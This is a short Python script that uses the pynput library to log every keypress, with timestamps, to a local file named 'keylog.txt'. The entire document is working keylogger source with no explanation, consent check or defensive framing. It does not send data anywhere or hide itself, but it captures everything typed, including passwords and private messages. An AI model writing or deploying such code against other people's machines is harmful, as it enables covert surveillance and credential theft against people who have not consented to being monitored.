
from pynput import keyboard
import logging

# Set the path for log file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
